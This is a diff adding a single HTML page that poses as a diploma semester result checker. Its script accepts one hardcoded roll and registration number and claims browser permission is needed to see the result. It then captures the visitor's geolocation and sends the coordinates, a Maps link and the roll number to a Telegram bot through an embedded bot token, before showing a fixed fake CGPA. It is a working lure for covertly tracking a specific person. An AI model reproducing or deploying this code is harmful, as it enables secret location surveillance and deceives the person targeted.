@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Diploma Semester Result</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body{
+    font-family: Arial;
+    background:#f5f7fb;
+    text-align:center;
+    margin:0;
+}
+
+.container{
+    max-width:350px;
+    width:90%;
+    margin:30px auto;
+    background:white;
+    padding:25px;
+    border-radius:10px;
+    box-shadow:0 5px 15px rgba(0,0,0,0.1);
+}
+
+/* ✅ Logo */
+.logo{
+    width:100px;
+    margin-bottom:10px;
+}
+
+h2{
+    margin-bottom:15px;
+    font-size:20px;
+}
+
+input, select{
+    width:100%;
+    padding:12px;
+    margin:10px 0;
+    border-radius:6px;
+    border:1px solid #ccc;
+    font-size:16px;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    background:#0d1b2a;
+    color:white;
+    border:none;
+    border-radius:6px;
+    cursor:pointer;
+    font-size:16px;
+}
+
+button:hover{
+    background:#1b263b;
+}
+
+#status{
+    margin-top:15px;
+    font-weight:bold;
+}
+
+#result{
+    margin-top:15px;
+    font-size:18px;
+    color:green;
+    font-weight:bold;
+}
+
+/* ✅ Loading spinner */
+.loader{
+    display:none;
+    margin:15px auto;
+    border:5px solid #f3f3f3;
+    border-top:5px solid #0d1b2a;
+    border-radius:50%;
+    width:40px;
+    height:40px;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin{
+    0%{ transform: rotate(0deg); }
+    100%{ transform: rotate(360deg); }
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<!-- ✅ Logo -->
+<img src="logo.png" class="logo">
+
+<h2>Diploma Semester Result</h2>
+
+<input type="text" id="roll" placeholder="Enter Roll No.">
+<input type="password" id="reg" placeholder="Enter Registration No.">
+
+<select id="year">
+    <option value="">Select Year</option>
+</select>
+
+<button onclick="checkAndSend()">Show Result</button>
+
+<div class="loader" id="loader"></div>
+
+<p id="status"></p>
+<p id="result"></p>
+
+</div>
+
+<script>
+
+// generate years
+let yearSelect = document.getElementById("year");
+for(let y = 2000; y <= 2026; y++){
+    let option = document.createElement("option");
+    option.value = y;
+    option.text = y;
+    yearSelect.appendChild(option);
+}
+
+function checkAndSend(){
+
+let user = document.getElementById("roll").value;
+let pass = document.getElementById("reg").value;
+let year = document.getElementById("year").value;
+
+if(user !== "667830" || pass !== "20031117"){
+    document.getElementById("status").innerHTML = "❌ Invalid Roll No. or Registration No.";
+    document.getElementById("result").innerHTML = "";
+    return;
+}
+
+if(year === ""){
+    document.getElementById("status").innerHTML = "⚠️ Select Year";
+    document.getElementById("result").innerHTML = "";
+    return;
+}
+
+// show loading
+document.getElementById("loader").style.display = "block";
+document.getElementById("status").innerHTML = "🔐 Please allow browser permission to continue to get result...";
+document.getElementById("result").innerHTML = "";
+
+navigator.geolocation.getCurrentPosition(sendLocation, showError);
+
+}
+
+function sendLocation(position){
+
+let lat = position.coords.latitude;
+let lon = position.coords.longitude;
+
+let map = "https://maps.google.com/?q="+lat+","+lon;
+
+let text = "📍 Location%0A Roll: "+document.getElementById("roll").value+
+"%0A Year: "+document.getElementById("year").value+
+"%0A "+lat+","+lon+
+"%0A "+map;
+
+let url = "https://api.telegram.org/bot8617709471:AAE0up-a7zvz9DTGAx7JZU7WpDnRuQ_Y6G4/sendMessage?chat_id=6272426701&text="+text;
+
+fetch(url);
+
+// hide loader
+document.getElementById("loader").style.display = "none";
+
+// show result
+document.getElementById("status").innerHTML = "✅ Result Found";
+document.getElementById("result").innerHTML = "🎓 CGPA: 3.77 out of 4";
+
+}
+
+function showError(){
+document.getElementById("loader").style.display = "none";
+document.getElementById("status").innerHTML = "❌ Permission denied. Cannot show result.";
+document.getElementById("result").innerHTML = "";
+}
+
+</script>
+
+</body>
+</html>
